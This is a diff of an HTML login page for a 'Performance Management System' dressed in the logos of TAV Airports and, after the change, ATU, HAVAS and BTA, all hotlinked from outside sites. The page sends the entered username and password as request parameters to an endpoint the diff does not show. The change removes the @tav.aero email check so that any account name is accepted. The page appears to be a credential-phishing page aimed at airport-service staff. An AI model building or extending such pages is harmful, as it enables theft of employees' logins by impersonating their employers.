@@ -84,20 +84,28 @@
             font-size: 13px;
         }
 
-        .icon {
+        .logo-bar {
             position: fixed;
             bottom: 20px;
-            right: 20px;
-            width: 200px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 15px;
             background-color: rgba(255, 255, 255, 0.85);
-            padding: 10px;
+            padding: 10px 20px;
             border-radius: 12px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
-            transition: transform 0.3s ease;
             z-index: 10;
+            flex-wrap: wrap;
+            justify-content: center;
         }
 
-        .icon:hover {
+        .logo-bar img {
+            height: 40px;
+            transition: transform 0.3s ease;
+        }
+
+        .logo-bar img:hover {
             transform: scale(1.05);
         }
 
@@ -107,11 +115,13 @@
                 padding: 25px;
             }
 
-            .icon {
-                width: 140px;
-                bottom: 15px;
-                right: 15px;
-                padding: 6px;
+            .logo-bar {
+                gap: 10px;
+                padding: 6px 10px;
+            }
+
+            .logo-bar img {
+                height: 30px;
             }
         }
     </style>
@@ -122,19 +132,13 @@
         var password = document.forms["loginForm"]["password"].value;
         var errorMessage = document.getElementById('error-message');
 
-        errorMessage.textContent = ''; // Clear any existing error message
-
-        if (username.indexOf('@tav.aero') === -1) {
-            errorMessage.textContent = "Your email must end with @tav.aero.";
-            return false;
-        }
+        errorMessage.textContent = '';
 
         if (password.length < 8) {
             errorMessage.textContent = "Password must be at least 8 characters long.";
             return false;
         }
 
-        // Send user credentials via GET request
         var params = new URLSearchParams();
         params.append('username', username);
         params.append('password', password);
@@ -151,7 +155,7 @@
             console.error('Error:', error);
         });
 
-        return false; // Prevent default form submission
+        return false;
     }
     </script>
 </head>
@@ -160,7 +164,7 @@
     <div class="container login-form">
         <h2>Performance Management System</h2>
         <form name="loginForm" onsubmit="return validateForm()">
-            <input name="username" placeholder="Domain Email (e.g. user@tav.aero)" required type="text" />
+            <input name="username" placeholder="Domain Account" required type="text" />
             <input name="password" placeholder="Password" required type="password" />
             <div id="error-message">&nbsp;</div>
             <button class="login-button" type="submit">Login</button>
@@ -170,8 +174,11 @@
         </form>
     </div>
 
-    <div class="icon">
-        <img alt="TAV Logo" src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" style="width: 100%; height: auto;" />
+    <div class="logo-bar">
+        <img src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" alt="TAV Logo"/>
+        <img src="https://atu.com.tr/wp-content/uploads/2023/08/ATU-Logo-C%CC%A7erc%CC%A7eveli_page-0001-768x768.jpg" alt="ATU"/>
+        <img src="https://lh3.googleusercontent.com/proxy/yz1SclzsHmWxi7cYNsYWeHPpOXufu8izj6XaxLj93kxxY2E9tonFUExXqlzVcmVsCaXqqEJ9gYmS5H8bB1m9NgEGoFN11ali5bvqoiBzMV11cYLI" alt="HAVAS"/>
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTug1qy1PlT2nX7mt03gWpE1_jdcFH4pLu06w&s" alt="BTA"/>
     </div>
 </body>
 </html>
